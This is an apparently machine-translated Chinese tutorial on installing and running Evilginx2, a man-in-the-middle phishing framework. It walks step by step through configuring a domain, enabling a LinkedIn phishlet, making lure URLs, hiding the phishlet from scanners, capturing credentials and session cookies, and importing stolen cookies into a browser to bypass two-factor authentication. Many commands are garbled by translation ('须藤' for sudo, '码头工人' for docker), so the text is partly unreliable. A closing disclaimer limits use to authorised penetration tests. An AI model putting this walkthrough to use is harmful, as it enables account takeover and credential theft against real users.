# Evilginx2:独立的中间人攻击框架

> 原文：<https://kalilinuxtutorials.com/evilginx2-man-in-the-middle-attack/>

**Evilginx2** 是一个中间人攻击框架，用于钓鱼登录凭证和会话 cookies，从而允许绕过双因素身份验证保护。

该工具是 2017 年发布的 [Evilginx](https://github.com/kgretzky/evilginx) 的继任者，该工具使用 nginx HTTP server 的定制版本来提供中间人功能，以充当浏览器和钓鱼网站之间的代理。

目前的版本完全是作为一个独立的应用程序在 GO 中编写的，它实现了自己的 HTTP 和 DNS 服务器，这使得它非常容易设置和使用。

**同时阅读[FindYara–IDA Python 插件用 Yara 规则扫描二进制](https://kalilinuxtutorials.com/findyara-ida-python-plugin/)**

### **eviginx 2 安装**

你可以为你的架构使用一个[预编译的二进制包](https://github.com/kgretzky/evilginx2/releases)，或者你可以从源代码编译 **evilginx2** 。

您将需要一个外部服务器来托管您的 **evilginx2** 安装。我个人推荐数字海洋，如果你跟随我的推荐链接，你将[获得额外的 10 美元用于免费的服务器](https://m.do.co/c/50338abc7ffe)。

Evilginx 在最基本的 Debian 8 VPS 上运行得非常好。

#### 从源安装

为了从源代码编译，请确保您已经安装了版本至少为 **1.10.0** 的 **GO** (从[这里](https://golang.org/doc/install)获取)并且`$GOPATH`环境变量设置正确(def。`$HOME/go`)。

安装完成后，将此添加到您的`**~/.profile**`中，假设您在`**/usr/local/go**`中安装了 **GO** :

**导出 GOPATH=$HOME/go
导出路径= $ PATH:/usr/local/go/bin:$ GOPATH/bin**

然后用`**source ~/.profiles**`加载。

现在你应该准备好安装 **evilginx2** 了。请遵循以下说明:

**sudo apt-get install git make
go get-u github . com/kgretzky/evilginx 2
CD $ gopath/src/github . com/kgretzky/evilginx 2
make**

您现在可以从本地目录运行 **evilginx2** ,如下所示:

**须藤。/bin/evilginx -p ./phishlets/**

或者全局安装:

**须藤制作安装
须藤邪恶**

以上说明也可用于将 **evilginx2** 更新至最新版本。

#### 使用 Docker 安装

您可以从 Docker 中启动 **evilginx2** 。首先构建容器:

**码头工人建造。-t evilginx2**

然后，您可以运行容器:

**坞站运行-it-p53:53/UDP-p80:80-p443:443 evilginx 2**

Phishlets 在`**/app/phishlets**`被加载到容器中，该容器可以作为一个卷进行安装和配置。

#### 从预编译的二进制包安装

从[这里](https://github.com/kgretzky/evilginx2/releases)拿起你想要的包裹，放在你的箱子上。然后做:

**拉开拉链。zip -d
cd**

如果要进行系统范围的安装，请使用具有 root 权限的安装脚本:

**chmod 700。/install.sh
sudo。/install.sh
须藤 evilginx**

或者从当前目录启动 **evilginx2** (您还需要 root 权限):

**chmod 700。/evilginx
须藤。/evilginx**

### **用途**

**重要！**确保`**TCP** **443**`、`**TCP 80**`和`**UDP 53**`端口没有服务监听。您可能需要关闭 apache 或 nginx 以及任何可能正在运行的用于解析 DNS 的服务。 **evilginx2** 会在启动时告诉你它是否无法打开这些端口上的监听套接字。

默认情况下， **evilginx2** 会在`**./phishlets/**`目录中查找网页仿冒品，之后在`**/usr/share/evilginx/phishlets/**`中查找。如果您想要指定一个自定义路径来加载网页仿冒网站，请在启动该工具时使用`**-p <phishlets_dir_path>**`参数。

的用法。/evilginx:
-debug
启用调试输出
-developer
启用开发者模式(为所有主机名生成自签名证书)
-p string
Phishlets 目录路径

你应该看到 **evilginx2** 的标志，并提示输入命令。如果您想查看可用的命令或关于它们的更多详细信息，请键入`**help**` 或`**help <command>**`。

### **入门**

要启动并运行，您需要首先做一些设置。

此时，我假设您已经注册了一个域(姑且称之为`yourdomain.com`)，并且在您的域提供商的管理面板中设置了域名服务器(包括`ns1`和`ns2`)以指向您的服务器的 IP 地址(例如 10.0.0.1):

ns1.yourdomain.com = 10 . 0 . 0 . 1
ns2.yourdomain.com = 10 . 0 . 0 . 1

使用以下命令设置服务器的域和 IP:

**配置域 yourdomain.com
配置 ip 10.0.0.1**

现在，您可以设置想要使用的 phishlet。为了这个简短的指南，我们将使用一个 LinkedIn phishlet。为网页仿冒网站设置主机名(显然必须包含您的域名):

**my.phishing.hostname.yourdomain.com LinkedIn 上的网页简介主机名**

现在您可以`enable`phish let，如果在本地没有找到您选择的主机名的证书，它将自动检索 LetsEncrypt SSL/TLS 证书:

**phishlets 启用 linkedin**

您的钓鱼网站现已上线。想想这个 URL，您希望受害者在成功登录后被重定向到该 URL，并获得如下钓鱼 URL(受害者将被重定向到`https://www.google.com`):

**https://www.google.com LinkedIn 网站**

运行的网络钓鱼只会响应标记化的链接，因此任何扫描您的主域的扫描器都将被重定向到在`config`下指定为`redirect_url`的 URL。如果你想隐藏你的网页仿冒网站，让它甚至对有效的令牌化网页仿冒网址都不作出响应，使用`phishlet hide/unhide <phishlet>`命令。

您可以使用以下工具监控捕获的凭据和会话 cookies:

**会话**

要获得关于捕获会话的详细信息，使用会话 cookie 本身(它将以 JSON 格式打印在底部)，选择它的会话 ID:

**会话**

使用 [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en) 扩展，可以将捕获的会话 cookie 复制并导入 Chrome 浏览器。

**重要！**如果你想让 **evilginx2** 在你退出服务器后继续运行，你应该在`screen`会话中运行它。

### **视频教程**

https://vimeo.com/281220095

### 放弃

*   我们非常清楚 Evilginx 可能被用于邪恶的目的。这项工作只是演示了熟练的攻击者可以做什么。
*   防御方有责任考虑此类攻击，并找到保护其用户免受此类网络钓鱼攻击的方法。
*   Evilginx 应仅在合法的渗透测试任务中使用，并获得潜在相关方的书面许可。

[**Download**](https://github.com/kgretzky/evilginx2)

**信用:** @cust0msync，@white_fi，rvrsh3ll @424f424f